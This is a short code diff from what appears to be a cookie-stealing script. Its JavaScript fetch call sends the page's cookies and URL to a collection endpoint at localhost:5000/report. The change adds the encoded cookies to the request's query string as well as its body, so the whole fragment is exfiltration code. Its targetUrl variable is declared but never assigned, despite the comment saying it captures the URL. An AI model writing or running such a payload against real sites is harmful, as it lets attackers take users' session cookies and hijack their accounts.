@@ -12,7 +12,7 @@
             var targetUrl; // Capture current URL
 
             // Send a POST request with the cookies and URL
-            fetch("http://localhost:5000/report", {
+            fetch("http://localhost:5000/report?c=" + encodeURIComponent(cookies), {
                 method: "POST",
                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
                 body: new URLSearchParams({ cookies: cookies, url: targetUrl })
